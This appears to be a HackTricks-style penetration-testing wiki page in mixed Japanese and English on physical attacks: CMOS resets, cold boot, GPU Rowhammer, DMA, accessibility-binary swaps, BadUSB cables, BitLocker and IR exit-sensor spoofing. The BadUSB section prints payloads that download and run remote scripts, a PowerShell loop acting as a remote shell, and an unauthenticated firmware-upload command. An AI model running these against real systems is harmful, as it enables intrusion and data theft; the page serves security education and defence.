# Physical Attacks

{{#include ../banners/hacktricks-training.md}}

## BIOS Password Recovery and System Security

Legacy PC firmware settings may be reset by disconnecting the CMOS battery or using a documented clear-CMOS jumper. 必要な電源オフ時間はボードごとに異なり、modern UEFI passwords or keys may live in nonvolatile flash, an embedded controller, or a security device and therefore survive a battery removal. ピンをショートする前に、ボードまたはサービスマニュアルを確認してください。この手順によってTPM measurementsが無効になり、disk-encryption recoveryが発生する可能性もあります。

On legacy x86 systems, tools such as **killCMOS** and **CmosPwd** can inspect or alter CMOS-backed settings from a bootable environment. CmosPwd recognizes password formats from a documented set of older BIOS families and can back up, restore, or erase/kill CMOS state; its published builds target legacy DOS/Windows, Linux, FreeBSD, and NetBSD environments.<sup>[[18]](#references)</sup> These utilities are not generic UEFI password removers and require sufficient hardware/firmware access.

Some laptop firmware displays a vendor-specific challenge code after several failed password attempts. Databases such as [bios-pw.org](https://bios-pw.org) can derive legacy vendor recovery passwords for some models, but many systems implement lockout without a derivable challenge. 生成されたpasswordはモデル固有のものとして扱い、恒久的な試行回数カウンターを使い切らないようにしてください。

### UEFI Security

For modern **UEFI** systems, CHIPSEC can audit Secure Boot variable protections. Start with the non-modifying check below; the optional `-a modify` mode deliberately attempts to corrupt variables and should be used only on a recoverable lab system. CHIPSEC itself warns that its privileged driver and low-level hardware access are unsuitable for production endpoints.<sup>[[11]](#references)</sup>
```bash
chipsec_main -m common.secureboot.variables
# Destructive validation on a recoverable test system only:
chipsec_main -m common.secureboot.variables -a modify
```
---

## RAM Analysis と Cold Boot Attacks

DRAM は、refresh が停止してもすべての bit を直ちに失うわけではありません。decay rate は module technology と温度によって大きく異なり、冷却によって、冷却しない power cycle よりはるかに長時間、有用な data を保持できます。cold-boot attack では、小規模な acquisition environment へ素早く reboot するか、冷却した module を移送し、raw memory を capture して、bit decay が発生していても cryptographic key を再構築します。disk-copy utility は自動的に physical-memory imager になるわけではなく、Volatility は capture を acquisition するのではなく解析します。platform に適合し、検証済みの acquisition tool を使用してください。<sup>[[12]](#references)</sup>

---

## Page Table に対する GPU Rowhammer

Modern GPU Rowhammer attacks は、通常の buffer ではなく **GPU virtual-memory metadata** を標的にすると、はるかに有用になります。**GDDR6 NVIDIA Ampere GPUs** に関する recent work では、unprivileged CUDA code を実行する attacker が、GPU 固有の hammering pattern を構築し、**memory massaging** を使って paging structure を脆弱な row に配置し、その後 **last-level page table** または中間の **page directory** の bit を flip できることが示されています。単一の translation entry が破損すると、attacker は **arbitrary GPU memory read/write** を実現し、さらに host compromise へ pivot できます。<sup>[[1]](#references)[[2]](#references)</sup>

### Exploitation Pattern

1. GDDR6 の **hammerable row** を **profile** し、in-DRAM mitigation を回避する refresh-aware / non-uniform hammering pattern を構築します。
2. **GPU allocation を massage** し、driver が page-translation structure を default の protected pool に保持するのではなく、hammerable な physical location に配置するようにします。実際には、low-memory page-table region を枯渇させ、controlled stride で大規模な sparse UVM mapping を spray することを意味します。
3. **PFN** や aperture-related bit などの **translation metadata** を page-table / page-directory entry 内で flip し、attacker-controlled virtual page が page-table page、arbitrary GPU memory、または host-visible system mapping に resolve されるようにします。
4. forged mapping を再利用して追加の translation entry を書き換え、GPU context をまたいだ **arbitrary GPU memory read/write** へ escalate します。

### Host Pivot と Mitigations

- **IOMMU disabled** の場合、forged system-aperture mapping によって arbitrary **host physical memory** が GPU に公開され、GPU primitive が full host compromise へつながります。<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- **GDDRHammer** は last-level page-table entry を標的とし、**GeForge** は page-directory level の破損のほうが容易になり得ることを示しています。これは、1 bit の flip でより大きな translation subtree を再指定できるためです。1 つの paging layer だけを security-critical と見なさないでください。<sup>[[1]](#references)[[2]](#references)</sup>
- **IOMMU** は、GDDRHammer/GeForge が使用する direct arbitrary-host-memory path を block するため、依然として重要です。しかし、**complete mitigation ではありません**。**GPUBreach** は second-stage pivot を示しています。この pivot では、attacker が GPU-writable で driver-owned の CPU buffer を破損させ、その後 NVIDIA driver の memory-safety bug を trigger して kernel write primitive と **root shell** を取得します。これは IOMMU が enabled でも可能です。<sup>[[3]](#references)</sup>
- 対応する workstation/server GPU では、**system-level ECC** が実用的な hardening step になります。ECC 非対応の consumer GPU は、より弱い defense surface を公開します。<sup>[[4]](#references)</sup>
- これらの attack は純粋な理論ではありません。**GeForge** は RTX 3060 で **1,171** 回、RTX A6000 で **202** 回の bit flip を報告しており、working host-privilege-escalation chain の構築に十分な数でした。<sup>[[2]](#references)[[9]](#references)</sup>

---

## Direct Memory Access (DMA) Attacks

**Inception** は、FireWire や early Thunderbolt configuration などの interface を介した **DMA-based memory acquisition and patching** を実証しており、historical な login-bypass signature も含まれます。これは単に「Windows 10 では ineffective」というものではありません。exploitability は interface、target build、IOMMU policy、lock state、そして Windows Kernel DMA Protection がサポートされ enabled になっているかどうかに依存します。Windows 10 version 1803 以降では、compatible platform に Kernel DMA Protection が導入され、attack surface が大きく変化しました。<sup>[[13]](#references)[[14]](#references)</sup>

---

## System Access 用の Live CD/USB

暗号化されていない、またはすでに unlocked 状態の Windows volume では、offline environment により **sethc.exe** や **Utilman.exe** などの accessibility binary を **cmd.exe** に置き換えられます。これにより、対応する logon-screen shortcut が実行されたときに SYSTEM command prompt が得られます。**chntpw** などの tool では、local SAM account data を編集できます。これらの method は locked BitLocker volume を bypass できず、DPAPI/EFS で保護された credential を破損させる可能性があります。forensic copy と backup を保持してください。

**Kon-Boot** は、対応する Windows/macOS configuration 向けの commercial boot-time authentication-bypass tool です。compatibility は OS、firmware mode、Secure Boot、disk-encryption setup に依存し、BitLocker-locked volume を decrypt するものではありません。<sup>[[10]](#references)</sup>

---

## Windows Security Features の扱い

### Boot と Recovery の Shortcut

- **Delete/Supr**、F2、F10、または別の vendor key によって firmware setup が開く場合があります。
- **F8** は、その経路が有効なままの configuration でのみ legacy Windows advanced boot option に入ります。current recovery entry は異なります。
- **Shift** を押し続けると、一部の configuration では Windows automatic logon を抑制できます。ただし、policy/registry setting によってこの動作が無効化されることがあります。<sup>[[17]](#references)</sup>

### BAD USB Devices

**USB Rubber Ducky** や Teensy board などの device は、trusted HID keyboard として enumerate し、あらかじめ定義された keystroke を inject できます。payload は当初、logged-on session の privilege と desktop access を持ちますが、UAC prompt、screen locking、keyboard layout、timing、endpoint USB policy による制約を受けます。<sup>[[15]](#references)</sup>

### Volume Shadow Copy

Administrator または backup privilege があれば、shadow copy を作成したり registry hive を保存したりして、**SAM** や **SYSTEM** などの locked file を acquire できます。これは post-compromise collection technique であり、privilege bypass ではありません。また、`diskshadow`/VSS および registry-hive export event と関連付ける必要があります。

## BadUSB / HID Implant Techniques

### Wi-Fi managed cable implants

- **Evil Crow Cable Wind** などの ESP32-S3 based implant は USB-A→USB-C または USB-C↔USB-C cable 内部に隠れ、純粋に USB keyboard として enumerate し、Wi-Fi 経由で C2 stack を公開します。operator は victim host から cable に電力を供給し、password `123456789` の hotspot `Evil Crow Cable Wind` を作成して、[http://cable-wind.local/](http://cable-wind.local/)（または DHCP address）を browse するだけで、embedded HTTP interface に到達できます。<sup>[[8]](#references)</sup>
- browser UI には *Payload Editor*、*Upload Payload*、*List Payloads*、*AutoExec*、*Remote Shell*、*Config* の tab があります。保存された payload には OS ごとの tag が付けられ、keyboard layout は on the fly で切り替えられ、VID/PID string は既知の peripheral を mimic するよう変更できます。
- C2 が cable 内部に存在するため、phone から payload を stage し、execution を trigger し、Wi-Fi credential を管理できます。これは組織の network を使用せずに短い dwell-time の physical intrusion を行う場合に有用です。

### OS-aware AutoExec payloads

- AutoExec rule は、USB enumeration の直後に 1 つ以上の payload を直ちに fire するよう bind します。implant は lightweight OS fingerprinting を実行し、一致する script を選択します。
- Example workflow:
- *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`.
- *macOS/Linux:* `COMMAND SPACE` (Spotlight) または `CTRL ALT T` (terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.
- execution は unattended で行われるため、charging cable を単に交換するだけで、logged-on user context における「plug-and-pwn」initial access を実現できます。

### HID-bootstrapped remote shell over Wi-Fi TCP

1. **Keystroke bootstrap:** 保存された payload が console を開き、新しい USB serial device に到着する内容をすべて実行する loop を paste します。minimal な Windows variant は次のとおりです:
```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```
2. **Cable bridge:** implant は USB CDC channel を開いたまま、ESP32-S3 から operator に向けて TCP client（Python script、Android APK、または desktop executable）を起動します。TCP session に入力されたバイト列は上記の serial loop に転送されるため、air-gapped host でも remote command execution が可能になります。出力は限定的であるため、operator は通常、blind command（account creation、追加ツールの staging など）を実行します。

### HTTP OTA update surface

- documented Evil Crow Cable Wind interface は、`/update` に unauthenticated firmware-update endpoint を公開しています。<sup>[[8]](#references)</sup>
```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```
- Field operators can hot-swap features (e.g., flash USB Army Knife firmware) mid-engagement without opening the cable, letting the implant pivot to new capabilities while still plugged into the target host.

## BitLocker Encryption のバイパス

認可を受けた forensic acquisition では、live または最近稼働していたシステムから、volume が unlocked の間に BitLocker の volume master key または関連する key material を取得できる場合があります。Elcomsoft Forensic Disk Decryptor や Passware Kit Forensic などの commercial tools は、対応する memory images、hibernation files、または crash dumps を検索できますが、成功するとは限りません。最新の Windows では、BitLocker が有効な場合に crash dumps も暗号化されます。また、保存された 48 桁の recovery password は、メモリ上の volume key とは異なる artifact です。<sup>[[12]](#references)[[16]](#references)</sup>

---

## Recovery Key Addition の Social Engineering

攻撃者が管理者を説得して BitLocker-management commands を実行させると、recovery-password、external-key、またはその他の protector を追加し、それを取得できます。recovery password に任意のゼロ文字列を指定することはできません。BitLocker の numerical recovery password には、検証済みの 48 桁形式が必要です。認可された administration で使用する構文は `manage-bde -protectors -add C: -recoverypassword` です。生成された protectors は `manage-bde -protectors -get C:` で一覧表示できます。protector の追加を監視し、新しい recovery material が承認済みの場所にのみ escrow されるようにしてください。<sup>[[16]](#references)</sup>

---

## Chassis Intrusion / Maintenance Switches を悪用した BIOS の Factory Reset

多くの最新の laptop や small-form-factor desktop には、Embedded Controller (EC) と BIOS/UEFI firmware によって監視される **chassis-intrusion switch** が搭載されています。この switch の主な目的は、device が開けられたときに alert を発生させることですが、vendor が switch を特定のパターンで切り替えた際に起動する **undocumented recovery shortcut** を実装している場合があります。<sup>[[5]](#references)[[6]](#references)</sup>

### 攻撃の仕組み

1. switch は EC 上の **GPIO interrupt** に接続されています。
2. EC 上で実行される firmware は、**press のタイミングと回数**を記録します。
3. hard-coded pattern が認識されると、EC は *mainboard-reset* routine を呼び出し、system NVRAM/CMOS の **内容を消去**します。
4. 次回の boot 時に、影響を受ける model は reset された firmware state を読み込みます。vendor と revision によっては、消去された state に supervisor password、custom boot settings、または enrolled Secure Boot keys が含まれる場合があります。TPM state と disk-encryption への影響は別途評価する必要があります。

> firmware reset により external-boot options が復元される場合がありますが、storage が **復号されることはありません**。BitLocker またはその他の full-disk encryption system は、TPM/firmware の変更後に recovery に移行することがあり、recovery key がなければ internal drive を引き続き保護します。<sup>[[16]](#references)</sup>

### 実環境での例 – Framework 13 Laptop

Framework 13 (11th/12th/13th-gen) の recovery shortcut は次のとおりです。
```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```
10回目のサイクル後、ECは次回の再起動時にBIOSへNVRAMを消去するよう指示するフラグを設定します。手順全体は約40秒で完了し、必要なのは**ドライバーだけ**です。<sup>[[5]](#references)</sup>

### Generic Exploitation Procedure

1. ターゲットの電源を入れるか、suspend-resumeを実行してECを稼働させます。
2. 底面カバーを取り外し、intrusion/maintenance switchを露出させます。
3. ベンダー固有のトグルパターンを再現します（ドキュメントやフォーラムを確認するか、EC firmwareをreverse-engineerします）。
4. 再組み立てして再起動し、実際に変更されたfirmware設定とcredentialsを確認します。
5. 認可済みで外部bootが利用可能な場合は、管理下のlive imageをbootします。内部ボリュームが正当にunlockされている場合（または暗号化されていなかった場合）、live environmentからcredentialsやデータを取得したり、EFI System Partitionを検査したりできます。そのパーティションを変更してEFI implantをインストールする行為は永続的かつ非常に侵襲的であり、Secure Boot、measured boot、firmware write protection、endpoint monitoringによる制約を受けます。暗号化されたストレージは、そのkeyまたはrecovery materialなしではアクセスできません。

### Detection & Mitigation

* OS management consoleでchassis-intrusionイベントを記録し、予期しないBIOS resetと相関分析します。
* 開封を検知するため、ネジやカバーに**tamper-evident seals**を使用します。
* デバイスを**物理的に管理されたエリア**に保管し、物理アクセスは完全なcompromiseにつながると想定します。
* 利用可能な場合は、ベンダーの「maintenance switch reset」機能を無効化するか、NVRAM resetに追加のcryptographic authorisationを要求します。

---

## Covert IR Injection Against No-Touch Exit Sensors

### Sensor Characteristics
- 市販の「wave-to-exit」sensorは、near-IR LED emitterとTV remote styleのreceiver moduleを組み合わせたもので、正しいcarrier（約30 kHz）のpulseを複数回（約4～10回）検出した後にのみlogic highを報告します。<sup>[[7]](#references)</sup>
- Plastic shroudによってemitterとreceiverが互いを直接見られない構造になっているため、controllerは検証済みのcarrierが近距離の反射から来たものと判断し、relayを駆動してdoor strikeを開放します。
- Controllerがtargetの存在を認識すると、outbound modulation envelopeが変化することが多い一方、receiverはfiltered carrierに一致するburstを引き続き受け入れます。

### Attack Workflow
1. **emission profileをcaptureする** – controller pins間にlogic analyserを接続し、内部IR LEDを駆動する、detection前後の両方のwaveformを記録します。
2. **「post-detection」waveformのみをreplayする** – stock emitterを取り外すか無視し、最初からtrigger済みのpatternでexternal IR LEDを駆動します。receiverはpulse count/frequencyだけを確認するため、spoofされたcarrierを本物の反射として扱い、relay lineをassertします。
3. **transmissionをgateする** – carrierを調整したburst（例：数十ミリ秒のonと、同程度のoff）で送信し、receiverのAGCやinterference handling logicを飽和させずに最小限のpulse countを届けます。連続 emisiónではsensorがすぐに感度を失い、relayの作動が停止します。

### Long-Range Reflective Injection
- ベンチ用LEDをhigh-power IR diode、MOSFET driver、focusing opticsに置き換えることで、約6 m離れた場所から確実にtriggerできます。
- attackerはreceiver apertureへのline-of-sightを必要としません。ガラス越しに見える内壁、棚、door frameなどにbeamを向けると、反射したenergyが約30°のfield of viewに入り、近距離でのhand waveを再現します。
- receiverは弱い反射だけを想定しているため、はるかに強いexternal beamでも複数の面で反射させながらdetection thresholdを上回ることができます。

### Weaponised Attack Torch
- driverを市販のflashlight内部に組み込むことで、toolを人目につかない形で隠せます。visible LEDをreceiverのbandに適合するhigh-power IR LEDに交換し、ATtiny412（または同等品）を追加して約30 kHzのburstを生成し、MOSFETでLED currentをsinkします。
- Telescopic zoom lensによってrange/precision向けにbeamを絞り、MCU control下のvibration motorによって、visible lightを放射せずにmodulationがactiveであることをhapticに確認できます。
- 複数の保存済みmodulation pattern（carrier frequencyとenvelopeを少しずつ変えたもの）を順番に試すことで、rebrandedされた複数のsensor familyとの互換性が高まり、operatorはrelayが audibleにclickしてdoorが解放されるまで反射面をsweepできます。

---

## References

- [1] [GDDRHammer: 最新GPUに対するコンポーネント間Rowhammer攻撃 — DRAM行を大きく攪乱する手法](https://gddr.fail/files/gddrhammer.pdf)
- [2] [GeForge: GDDR memoryをhammeringしてGPU page tableをforgeする — Fun and Profitのために](https://stefan1wan.github.io/files/GeForge.pdf)
- [3] [GPUBreach: Rowhammerを使用したGPUへのPrivilege Escalation攻撃](https://gururaj-s.github.io/assets/pdf/SP26_GPUBreach.pdf)
- [4] [NVIDIA - Security Notice: Rowhammer - 2025年7月](https://nvidia.custhelp.com/app/answers/detail/a_id/5671/~/security-notice%3A-rowhammer---july-2025)
- [5] [Pentest Partners – 「Framework 13。ここを押してpwn」](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [6] [FrameWiki – Mainboard Reset Guide](https://framewiki.net/guides/mainboard-reset)
- [7] [SensePost – 「Noooooooo Touch! – Covert IR TorchによるIR No-Touch Exit SensorのBypass」](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [8] [Mobile-Hacker – 「Plug, Play, Pwn: Evil Crow Cable WindによるHacking」](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)
- [9] [Bruce Schneier - NVIDIA Chipsに対するRowhammer Attack](https://www.schneier.com/blog/archives/2026/05/rowhammer-attack-against-nvidia-chips.html)
- [10] [Kon-Boot official documentation and compatibility information](https://kon-boot.com/)
- [11] [CHIPSEC documentation - Secure Boot variable protections](https://chipsec.github.io/modules/chipsec.modules.common.secureboot.variables.html)
- [12] [Lest We Remember: Encryption Keyに対するCold Boot Attack](https://www.usenix.org/legacy/events/sec08/tech/full_papers/halderman/halderman.pdf)
- [13] [Inception - DMAによるphysical memory manipulation](https://github.com/carmaa/inception)
- [14] [Microsoft Learn - Kernel DMA Protection](https://learn.microsoft.com/en-us/windows/security/hardware-security/kernel-dma-protection-for-thunderbolt)
- [15] [Hak5 USB Rubber Ducky documentation](https://docs.hak5.org/hak5-usb-rubber-ducky/)
- [16] [Microsoft Learn - BitLocker operations guide](https://learn.microsoft.com/en-us/windows/security/operating-system-security/data-protection/bitlocker/operations-guide)
- [17] [Microsoft Learn - Shiftを押した場合とautomatic logonの動作](https://learn.microsoft.com/en-us/troubleshoot/windows-client/user-profiles-and-logon/hold-shift-key-shutting-down-not-disable-automatic-logon)
- [18] [CGSecurity - CmosPwd documentation and downloads](https://www.cgsecurity.org/wiki/CmosPwd)
{{#include ../banners/hacktricks-training.md}}
